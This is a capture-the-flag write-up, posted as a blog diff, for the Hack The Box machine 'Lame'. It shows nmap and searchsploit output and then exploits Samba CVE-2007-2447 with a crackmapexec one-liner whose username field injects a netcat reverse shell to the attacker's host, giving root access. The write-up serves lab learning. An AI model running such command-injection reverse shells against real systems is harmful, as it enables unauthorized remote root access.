@@ -4,4 +4,177 @@ title:  "Lame"
 date:   2023-10-27 01:50:30 -0400
 categories: jekyll update
 ---
-This will be my first writeup.
+
+
+Lame
+
+A relatively easy box. It has a VSFTPd server on a vulnerable version but is not exploitable. 
+
+## Recon
+### nmap
+```
+┌──(root💀kali)-[/home/spacemoth/machines/lame]
+└─# nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.3
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-27 15:23 EDT
+Nmap scan report for 10.10.10.3
+Host is up (0.052s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 17.92 seconds
+
+┌──(root💀kali)-[/home/spacemoth/machines/lame]
+└─# nmap -sU -p- --min-rate 10000 -oA scans/alludp 10.10.10.3
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-27 15:29 EDT
+Nmap scan report for 10.10.10.3
+Host is up (0.14s latency).
+Not shown: 65532 open|filtered udp ports (no-response)
+PORT     STATE  SERVICE
+139/udp  closed netbios-ssn
+445/udp  closed microsoft-ds
+3632/udp closed distcc
+
+Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds
+
+┌──(root💀kali)-[/home/spacemoth/machines/lame]
+└─# nmap -p 21,22,139,445,3632 -sV -sC -oA scans/tcpscripts 10.10.10.3
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-27 15:30 EDT
+Nmap scan report for 10.10.10.3
+Host is up (0.039s latency).
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.24
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
+|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h58m08s, deviation: 2h49m45s, median: -1m53s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2023-10-27T15:28:51-04:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.46 seconds
+```
+
+### FTP - TCP 21
+#### Anonymous Login
+FTP allows anonymous logins. I login but its empty.
+#### Exploits
+Let's use `searchsploit` and lookup Vsftpd 2.3.4:
+```
+┌──(root💀kali)-[/home/spacemoth/machines/lame]
+└─# searchsploit vsftpd 2.3.4 
+--------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                 |  Path
+--------------------------------------------------------------------------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution                                                                      | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                         | unix/remote/17491.rb
+--------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results ```
+```
+I tried the vsftpd 2.3.4 sploit but with no success.
+## Samba
+
+#### Exploits
+I lookup the Samba version in `searchsploit`:
+```
+┌──(root💀kali)-[/home/spacemoth/machines/lame]
+└─# searchsploit samba 3.0
+--------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                 |  Path
+--------------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                           | osx/remote/16875.rb
+Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                         | multiple/remote/10095.txt
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                               | unix/remote/16320.rb
+Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                             | linux/remote/9950.rb
+Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                         | linux/remote/16859.rb
+Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                       | solaris/remote/16329.rb
+Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                       | linux/dos/4732.c
+Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                              | multiple/dos/5712.pl
+Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                               | linux/remote/364.pl
+Samba < 3.0.20 - Remote Heap Overflow                                                                          | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                  | linux_x86/dos/36741.py
+--------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+```
+I research the exploit Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution.
+## Samba Exploit
+I found this one liner to gain a reverse shell:
+```
+┌──(root💀kali)-[/home/spacemoth/machines/lame/CVE-2007-2447]
+└─# crackmapexec smb --shares 10.10.10.3 -u './=`nohup nc -e /bin/sh 10.10.14.24 1234`' -p ''
+SMB         10.10.10.3      445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
+SMB         10.10.10.3      445    LAME             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+```
+
+#### NC
+```
+┌──(root💀kali)-[/home/spacemoth/machines/lame/CVE-2007-2447]
+└─# nc -lvnp 1234                               
+listening on [any] 1234 ...
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.3] 46284
+whoami                                                                                                                                           
+root                                                                                                                                             
+python -c "import pty;pty.spawn('/bin/bash')"
+```
+#### Flags
+```                                                                                                  
+root@lame:/# cd /home                                                                                                                            
+cd /home                                                                                                                                         
+root@lame:/home# ls                                                                                                                              
+ls                                                                                                                                               
+ftp  makis  service  user                                                                                                                        
+root@lame:/home# cd makis                                                                                                                        
+cd makis                                                                                                                                         
+root@lame:/home/makis# ls                                                                                                                        
+ls                                                                                                                                               
+user.txt                                                                                                                                         
+root@lame:/home/makis# cat user.txt
+cat user.txt
+90ad***************************
+root@lame:/home/makis# cd /root
+cd /root
+root@lame:/root# ls
+ls
+Desktop  reset_logs.sh  root.txt  vnc.log
+root@lame:/root# cat root.txt
+cat root.txt
+414e1**************************
+root@lame:/root# 
+```
